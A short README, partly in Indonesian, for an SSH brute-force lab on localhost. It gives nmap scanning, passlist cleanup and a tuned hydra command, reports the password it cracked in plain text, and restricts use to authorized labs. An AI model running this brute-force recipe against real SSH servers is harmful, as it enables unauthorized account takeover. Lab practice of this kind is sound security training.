
# SSH-Brute-Force-Lab---Internal-Audit

COMMAND I USE
tools = hydra,nmap

#cek port yang kebuka 
nmap -sT 127.0.0.1
pasti yang keluar port 8022
# 1. Cek format passlist (ada \r)
cat -A passlist.txt

# 2. Bersihin passlist
sed -i 's/\r//g; s/ *$//g' passlist.txt

# 3. Reset service pas error
pkill sshd; rm hydra.restore; sshd; sleep 2

# 4. Eksekusi utama (low & slow biar stabil)
hydra -I -l u0_a2027 -P passlist.txt -s 8022 -t 2 -W 1 -V 127.0.0.1 ssh

# 5. Validasi akses
ssh -p 8022 u0_a2027@127.0.0.1

Root Cause: MaxStartups pada sshd lab memblokir 16 thread.
Fix: Menurunkan thread dan menambah delay.
Result: Berhasil mendapatkan kredensial dalam ∼16 menit.

login: u0_a2027
password: pamulang123

buka server local
python -m http.server 8080

disclaimer: For educational & authorized internal audit only on localhost / lab VM


full walkthrough:https://youtu.be/Lqj2Y-KAsnc?si=nzdkv0wdla77k4hP
